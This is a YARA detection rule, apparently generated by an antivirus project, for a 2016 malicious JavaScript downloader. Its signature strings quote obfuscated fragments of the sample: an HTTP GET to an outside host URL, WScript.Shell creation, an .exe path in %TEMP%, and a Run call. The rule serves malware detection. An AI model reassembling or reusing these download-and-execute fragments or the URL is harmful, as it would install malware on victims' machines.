rule sig_20160330_74deaf8240bcd17d7aafab89a2f264da {
  meta:
    description = "datamaliciousorder - file 20160330_74deaf8240bcd17d7aafab89a2f264da.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7190e61bbf0b2c2f41e93158dd0c756aaa5330dac0e24154a629b87fa38c9a9b"

  strings:
    $s1  = "_C0[_T](\"GET\", \"http://smartbs-cameroun.com/nc7sjd\", false);" fullword ascii
    $s2  = "var _W0 = function _NU() {return WScript[_XM](\"WScript\"+\".Shell\");}(), _RX = 11;" fullword ascii
    $s3  = "function _M(_JS, _R){_U = _U * 1; return _JS - _R;};" fullword ascii
    $s4  = "if (_C0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _N() {return _W0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"AdEySS9EdDj6.ex\" + \"e\";};" fullword ascii
    $s6  = "function _RO(){return _U0 + \"\";};" fullword ascii
    $s7  = "function _SA() {return ((_J0 == true) && (_J0 == _YR)) ? 1 : _U;};" fullword ascii
    $s8  = "function _A(_C){_W0[\"Run\"](_C, _U, _U);};" fullword ascii
    $s9  = "function _Q()" fullword ascii
    $s10 = "var _VK = new this[\"Date\"]();" fullword ascii
    $s11 = "function _V(){return 22;};" fullword ascii
    $s12 = "function _Z(){return _XM;};" fullword ascii
    $s13 = "return _M(_D, _ZI);" fullword ascii
    $s14 = " while (_ZL){" fullword ascii
    $s15 = "function _WE(_H) {var _Z0 = (1, 2, 3, 4, 5, _H); return _Z0;};" fullword ascii
    $s16 = "_J0 = true; " fullword ascii
    $s17 = "var _J0 = false;" fullword ascii
    $s18 = "var _YY = false;" fullword ascii
    $s19 = "_YR = true; " fullword ascii
    $s20 = "var _YR = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}